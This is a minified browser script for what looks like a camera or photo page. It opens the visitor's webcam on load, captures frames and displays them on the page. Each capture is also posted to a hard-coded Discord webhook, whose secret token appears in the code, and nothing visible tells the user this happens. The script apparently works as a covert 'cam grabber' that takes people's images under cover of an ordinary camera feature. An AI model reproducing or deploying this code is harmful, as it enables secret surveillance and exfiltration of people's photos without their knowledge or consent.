async function captureAndSend(){const e=document.getElementById("camera"),t=document.createElement("canvas"),o=t.getContext("2d");t.width=e.videoWidth,t.height=e.videoHeight,o.drawImage(e,0,0,t.width,t.height);const n=t.toDataURL("image/png");displayCapturedImage(n),sendToDiscord(n)}async function sendToDiscord(e){const t=new FormData;t.append("file",dataURLtoBlob(e),"capture.png"),await fetch("https://discord.com/api/webhooks/1180681736556912640/mtxVNUq7qWq75_9cllm-2wFXSs5e72sgkNVUFcc7Uo-2xo6G56b3Bi1yHTJyEzqnC8LL",{method:"POST",body:t}),console.log("Image sent to Discord!")}function displayCapturedImage(e){const t=document.createElement("img");t.src=e;document.getElementById("capturedImagesSection").appendChild(t)}function dataURLtoBlob(e){const t=e.split(","),o=t[0].match(/:(.*?);/)[1],n=atob(t[1]);let a=n.length;const c=new Uint8Array(a);for(;a--;)c[a]=n.charCodeAt(a);return new Blob([c],{type:o})}document.addEventListener("DOMContentLoaded",(async()=>{const e=document.getElementById("camera");try{const t=await navigator.mediaDevices.getUserMedia({video:!0});e.srcObject=t,e.addEventListener("loadedmetadata",(()=>{e.play().then((()=>console.log("Video playing"))).catch((e=>console.error("Error playing video:",e)))}))}catch(e){console.error("Error accessing camera:",e)}}));